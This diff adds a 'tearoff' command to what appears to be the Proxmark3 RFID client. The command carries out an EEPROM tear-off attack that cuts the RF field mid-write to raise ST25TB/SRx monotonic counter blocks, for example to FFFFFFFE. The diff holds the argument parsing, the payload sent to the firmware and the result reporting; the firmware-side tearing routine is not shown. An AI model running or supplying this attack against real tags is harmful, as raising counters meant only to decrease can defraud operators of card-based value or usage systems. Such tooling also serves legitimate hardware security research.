@@ -3192,6 +3192,135 @@ static int CmdHF14BMobibRead(const char *Cmd) {
     return PM3_SUCCESS;
 }
 
+static int CmdHF14BSriTearoff(const char *Cmd) {
+
+    CLIParserContext *ctx;
+    CLIParserInit(&ctx, "hf 14b tearoff",
+                  "Use tear-off technique to manipulate ST25TB/SRx monotonic counter blocks.\n"
+                  "This exploits EEPROM tearing to increment counters that normally can only\n"
+                  "be decremented. Based on the near-field-chaos project by SecLabz.\n"
+                  "\n"
+                  "The attack works by sending a write command and cutting the RF field at\n"
+                  "a precise moment, causing a partial write that can raise the counter value.\n"
+                  "The operation usually takes a few seconds to a few minutes.\n"
+                  "\n"
+                  " NOTE: 0xFFFFFFFE values may be unstable due to tag internals.\n"
+                  "       Keep the tag positioned steadily on the antenna.\n",
+                  "hf 14b tearoff -b 5 -d FFFFFFFE\n"
+                  "hf 14b tearoff -b 6 -d FFFFFFFE\n"
+                  "hf 14b tearoff -b 5 -d FFFFFFFE --start 5000 --adj 50\n"
+                  "hf 14b tearoff -b 5 -d FFFFFFFE --safety 1000\n"
+                 );
+
+    void *argtable[] = {
+        arg_param_begin,
+        arg_int1("b", "block",   "<dec>", "block number (typically 5 or 6 for ST25TB counters)"),
+        arg_str1("d", "data",    "<hex>", "target counter value (4 hex bytes, e.g. FFFFFFFE)"),
+        arg_int0(NULL, "adj",    "<dec>", "tear-off timing step in us (default: 25)"),
+        arg_int0(NULL, "safety", "<dec>", "safety threshold value (default: 0x1000)"),
+        arg_int0(NULL, "start",  "<dec>", "initial tear-off delay in us (default: 150)"),
+        arg_param_end
+    };
+    CLIExecWithReturn(ctx, Cmd, argtable, false);
+
+    int blockno = arg_get_int_def(ctx, 1, -1);
+
+    int dlen = 0;
+    uint8_t data[4] = {0};
+    int res = CLIParamHexToBuf(arg_get_str(ctx, 2), data, sizeof(data), &dlen);
+    if (res) {
+        CLIParserFree(ctx);
+        return PM3_EINVARG;
+    }
+
+    int adj = arg_get_int_def(ctx, 3, 0);
+    int safety = arg_get_int_def(ctx, 4, 0x1000);
+    int start = arg_get_int_def(ctx, 5, 0);
+    CLIParserFree(ctx);
+
+    if (dlen != 4) {
+        PrintAndLogEx(FAILED, "target value must be 4 hex bytes, got %d", dlen);
+        return PM3_EINVARG;
+    }
+
+    if (blockno < 0 || blockno > 255) {
+        PrintAndLogEx(FAILED, "block number must be 0-255, got %d", blockno);
+        return PM3_EINVARG;
+    }
+
+    // Convert data bytes to uint32_t (little-endian as per ST25TB convention)
+    uint32_t target_value = (uint32_t)data[0] << 24 |
+                            (uint32_t)data[1] << 16 |
+                            (uint32_t)data[2] << 8  |
+                            (uint32_t)data[3];
+
+    PrintAndLogEx(INFO, "");
+    PrintAndLogEx(INFO, "--- " _CYAN_("ST25TB Tear-off Attack") " ---------");
+    PrintAndLogEx(INFO, " block............. " _YELLOW_("%d"), blockno);
+    PrintAndLogEx(INFO, " target value...... " _YELLOW_("0x%08X"), target_value);
+    PrintAndLogEx(INFO, " start delay....... " _YELLOW_("%d") " us", start > 0 ? start : 150);
+    PrintAndLogEx(INFO, " timing step....... " _YELLOW_("%d") " us", adj > 0 ? adj : 25);
+    PrintAndLogEx(INFO, " safety threshold.. " _YELLOW_("0x%04X"), safety);
+    PrintAndLogEx(INFO, "");
+    PrintAndLogEx(INFO, "Press " _GREEN_("pm3 button") " or " _GREEN_("Enter") " to abort");
+    PrintAndLogEx(INFO, "");
+
+    // Build payload (must match st25tb_tearoff_params_t on ARM side)
+    struct {
+        uint8_t  block_address;
+        uint32_t target_value;
+        uint32_t tear_off_adjustment_us;
+        uint32_t safety_value;
+        uint32_t start_time_us;
+    } PACKED payload;
+
+    payload.block_address = (uint8_t)blockno;
+    payload.target_value = target_value;
+    payload.tear_off_adjustment_us = (uint32_t)adj;
+    payload.safety_value = (uint32_t)safety;
+    payload.start_time_us = (uint32_t)start;
+
+    clearCommandBuffer();
+    SendCommandNG(CMD_HF_ISO14443B_ST25TB_TEAROFF, (uint8_t *)&payload, sizeof(payload));
+
+    // Wait for response with generous timeout.
+    // The ARM side sends periodic CMD_WTX keepalive packets to extend
+    // the timeout, so the attack can run as long as needed.
+    // Use -1 for infinite wait (extended via WTX), abort with Enter key.
+    PacketResponseNG resp;
+    if (WaitForResponseTimeout(CMD_HF_ISO14443B_ST25TB_TEAROFF, &resp, -1) == false) {
+        PrintAndLogEx(WARNING, "command failed or connection lost");
+        return PM3_ETIMEOUT;
+    }
+
+    if (resp.status == PM3_SUCCESS) {
+        uint32_t final_value = 0;
+        if (resp.length >= sizeof(uint32_t)) {
+            memcpy(&final_value, resp.data.asBytes, sizeof(uint32_t));
+        }
+        PrintAndLogEx(SUCCESS, "Tear-off attack " _GREEN_("successful"));
+        PrintAndLogEx(SUCCESS, "Final block value: " _GREEN_("0x%08X"), final_value);
+    } else if (resp.status == PM3_EOPABORTED) {
+        uint32_t final_value = 0;
+        if (resp.length >= sizeof(uint32_t)) {
+            memcpy(&final_value, resp.data.asBytes, sizeof(uint32_t));
+        }
+        PrintAndLogEx(WARNING, "Tear-off attack " _YELLOW_("aborted by user"));
+        PrintAndLogEx(INFO, "Last known value: 0x%08X", final_value);
+    } else {
+        PrintAndLogEx(FAILED, "Tear-off attack " _RED_("failed"));
+        if (resp.length >= sizeof(uint32_t)) {
+            uint32_t final_value = 0;
+            memcpy(&final_value, resp.data.asBytes, sizeof(uint32_t));
+            PrintAndLogEx(INFO, "Last known value: 0x%08X", final_value);
+        }
+    }
+
+    PrintAndLogEx(INFO, "");
+    PrintAndLogEx(HINT, "Hint: use " _YELLOW_("`hf 14b rdbl -b %d`") " to verify the block", blockno);
+    return PM3_SUCCESS;
+}
+
 static int CmdHF14BSetUID(const char *Cmd) {
 
     CLIParserContext *ctx;
@@ -3288,6 +3417,7 @@ static command_t CommandTable[] = {
     {"sim",       CmdHF14BSim,         IfPm3Iso14443b,  "Fake ISO ISO-14443-B tag"},
     {"sniff",     CmdHF14BSniff,       IfPm3Iso14443b,  "Eavesdrop ISO-14443-B"},
     {"wrbl",      CmdHF14BSriWrbl,     IfPm3Iso14443b,  "Write data to a SRI512/SRIX4 tag"},
+    {"tearoff",   CmdHF14BSriTearoff,  IfPm3Iso14443b,  "Tear-off attack on ST25TB/SRx counter blocks"},
     {"view",      CmdHF14BView,        AlwaysAvailable, "Display content from tag dump file"},
     {"valid",     CmdSRIX4kValid,      AlwaysAvailable, "SRIX4 checksum test"},
     {"---------", CmdHelp,             AlwaysAvailable, "------------------ " _CYAN_("Calypso / Mobib") " ------------------"},
